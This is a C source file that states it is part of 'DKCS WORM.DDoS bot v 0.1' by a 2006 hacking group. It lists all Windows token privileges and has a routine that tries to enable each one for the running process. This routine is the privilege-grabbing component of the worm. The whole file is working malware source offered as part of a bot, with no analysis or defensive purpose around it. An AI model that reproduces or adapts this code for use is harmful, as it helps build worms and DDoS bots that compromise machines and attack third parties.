//-----------------------------------------------------------------
// this file is a part of: DKCS WORM.DDoS bot v 0.1
// c0d3d by: Dr.Pixel
// 2006 (C) DKCS Security Team
//
// contacts:	e-mail:	dkcs@void.ru
//				icq:	7600278
//				web:	http://dkcs.void.ru
//				forum:	http://dkcs.net.ru
//-----------------------------------------------------------------
struct{
	char* szPrivName;
}

privilages[] =
{
	"SeCreateTokenPrivilege",
	"SeAssignPrimaryTokenPrivilege",
	"SeLockMemoryPrivilege",
	"SeIncreaseQuotaPrivilege",
	"SeUnsolicitedInputPrivilege",
	"SeMachineAccountPrivilege",
	"SeTcbPrivilege",
	"SeSecurityPrivilege",
	"SeTakeOwnershipPrivilege",
	"SeLoadDriverPrivilege",
	"SeSystemProfilePrivilege",
	"SeSystemtimePrivilege",
	"SeProfileSingleProcessPrivilege",
	"SeIncreaseBasePriorityPrivilege",
	"SeCreatePagefilePrivilege",
	"SeCreatePermanentPrivilege",
	"SeBackupPrivilege",
	"SeRestorePrivilege",
	"SeShutdownPrivilege",
	"SeDebugPrivilege",
	"SeAuditPrivilege",
	"SeSystemEnvironmentPrivilege",
	"SeChangeNotifyPrivilege",
	"SeRemoteShutdownPrivilege",
	"SeUndockPrivilege",
	"SeSyncAgentPrivilege",
	"SeEnableDelegationPrivilege",
	"SeManageVolumePrivilege"
};
//-----------------------------------------------------------------
BOOL GetPrivilege(char* SeNamePriv){

	HANDLE            hToken;
	LUID              lpLuid;
	TOKEN_PRIVILEGES  NewState;

	if(OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hToken)){
		if(LookupPrivilegeValue(NULL, SeNamePriv, &lpLuid)){
			NewState.PrivilegeCount = 1;
			NewState.Privileges[0].Luid = lpLuid;
			NewState.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			AdjustTokenPrivileges (hToken, FALSE, &NewState, sizeof(NewState), NULL, NULL);
			return TRUE;
		}
    CloseHandle (hToken);
	}
return FALSE;
}
//-----------------------------------------------------------------
void GetMaxPriv(void){

	int count = ((int)(sizeof privilages/sizeof privilages[0]));

	for(int i=0; i<count; i++){
		GetPrivilege(privilages[i].szPrivName);
	}

}
//------------------------------------------------------------------